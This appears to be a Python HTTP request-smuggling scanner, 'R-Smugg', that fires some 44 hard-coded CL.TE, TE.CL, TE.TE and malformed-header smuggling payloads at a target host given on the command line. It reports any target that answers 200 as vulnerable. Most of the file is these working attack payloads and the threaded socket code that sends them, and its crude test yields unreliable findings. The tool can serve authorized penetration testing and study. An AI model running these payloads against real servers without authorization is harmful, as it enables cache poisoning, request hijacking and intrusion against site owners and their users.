print("""
 /$$$$$$$           /$$$$$$                                             
| $$__  $$         /$$__  $$                                            
| $$  \ $$        | $$  \__/ /$$$$$$/$$$$  /$$   /$$  /$$$$$$   /$$$$$$ 
| $$$$$$$/ /$$$$$$|  $$$$$$ | $$_  $$_  $$| $$  | $$ /$$__  $$ /$$__  $$
| $$__  $$|______/ \____  $$| $$ \ $$ \ $$| $$  | $$| $$  \ $$| $$  \ $$
| $$  \ $$         /$$  \ $$| $$ | $$ | $$| $$  | $$| $$  | $$| $$  | $$
| $$  | $$        |  $$$$$$/| $$ | $$ | $$|  $$$$$$/|  $$$$$$$|  $$$$$$$
|__/  |__/         \______/ |__/ |__/ |__/ \______/  \____  $$ \____  $$
                                                     /$$  \ $$ /$$  \ $$
                                                    |  $$$$$$/|  $$$$$$/
                                                     \______/  \______/ 
========================================================================
[*] [R-Smugg V 1.0 - HTTP Smuggler Scanner] [Afrizal F.A - R&D ICWR]
========================================================================
""")

import socket
import ssl
import argparse
import atexit
from concurrent.futures import ThreadPoolExecutor as T

class R_Smugg:

    def __init__(self, host, port = 80, ssl = '', path = ""):

        self.host = host
        self.port = port if port else 80
        self.ssl = ssl
        self.path = ("/{}".format(path) if path[0] != '/' else path) if path else "/"
        self.result = ''

        atexit.register(self.atExitFunc)

    def atExitFunc(self):

        if self.result != '':

            print("")
            print("[+] [Result]")
            print("")
            print(self.result)

        else:

            print("")
            print("[-] [No result]")

    def payloads(self, host):

        path = self.path

        payloads = {

            "CL.TE": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "CL.TE_double_CRLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 12\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n",
            "TE.TE": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "TE.TE.2CL": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\nG\r\n",
            "CL.TE.CRLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 11\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n",
            "TE.CLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\nG\r\n",
            "TE.CRLF": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n",
            "CL.TE_identity": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n0\r\n\r\n",
            "TE.CLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nG\r\n",
            "CL.TE_gzip": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\n",
            "TE.CRLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n0\r\n\r\n",
            "TE.TE_keepalive": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\nG\r\n",
            "CL.TE_chunked_TE": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n",
            "TE.TE_CRLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nG\r\n0\r\n\r\n",
            "TE.TE_2CL_CRLF_chunked": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\nG\r\n0\r\n\r\n",
            "TE.TE_CRLF_keepalive": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\nG\r\n",
            "TE.TE_CRLF_close": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\nG\r\n",
            "CL.TE_Malformed_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: -1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_Malformed_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunkd\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "CL.TE_Whitespace_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length:  13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_Whitespace_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding:  chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "CL.TE_Tab_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length:\t13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_Tab_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "CL.TE_Line_Feed_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nG",
            "TE.CL_Line_Feed_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\nG\n",
            "CL.TE_CR_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\rContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_CR_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\rTransfer-Encoding: chunked\rContent-Length: 4\r\r\n0\rG\r",
            "CL.TE_Extra_LF_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\n\n",
            "TE.CL_Extra_LF_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n\n",
            "CL.TE_Extra_CR_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r\r",
            "TE.CL_Extra_CR_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n\r",
            "CL.TE_Empty_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\n\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_Empty_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\n\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nG\r\n",
            "CL.TE_No_Colon_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_No_Colon_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nG",
            "CL.TE_Trailing_Space_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13 \r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_Trailing_Space_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked \r\n\r\n0\r\n\r\nG",
            "CL.TE_LF_Header_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nG",
            "TE.CL_LF_Header_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\nG\n",
            "CL.TE_CR_Header_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\rContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "TE.CL_CR_Header_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\rTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "CL.TE_Trailing_LF_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\n",
            "TE.CL_Trailing_LF_Transfer-Encoding": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
            "CL.TE_Trailing_CR_Content-Length": f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG\r"

        }

        return payloads

    def smuggling(self, host, port, use_ssl, payload_name, payload):

        try:

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            if use_ssl and use_ssl.lower() == 'y':

                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname = host)
            
            sock.connect((host, port))
            sock.sendall(payload.encode())

            response = sock.recv(100).decode()
            status_code = response.split("\r\n")[0].split(" ")[1]

            if '200' in status_code:

                output = f"[+] [Vuln] [HOST: {host}] [PORT: {port}] [PATH: {self.path}] [Payload: {payload_name}] [HTTP Status Code: {status_code}]"
                print(output)

                self.result += "\n{}".format(output)
                self.result += "\n[*] [--- Header Request ---]"
                self.result += "\n{}".format(payload)
                self.result += "\n[*] [--- End Header Request ---]\n"

            else:

                print(f"[-] [Not Vuln] [HOST: {host}] [PORT: {port}] [PATH: {self.path}] [Payload: {payload_name}] [HTTP Status Code: {status_code}]")
                pass

            sock.close()

        except Exception as e:

            print(f"[-] [Error: {e}]")

    def proc(self):

        with T(max_workers = len(self.payloads(self.host).items())) as executor:

            for payload_name, payload in self.payloads(self.host).items():

                executor.submit(self.smuggling, self.host, self.port, self.ssl, payload_name, payload)

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-x", "--host", help = "HOST Target", required = True)
    parser.add_argument("-p", "--port", help = "PORT (Default 80)", type = int)
    parser.add_argument("-s", "--ssl", help = "Use SSL (Y/N) (Default: N)")
    parser.add_argument("-d", "--path", help = "URL Path Target")
    args = parser.parse_args()

    smugg = R_Smugg(args.host, args.port, args.ssl, args.path)
    smugg.proc()
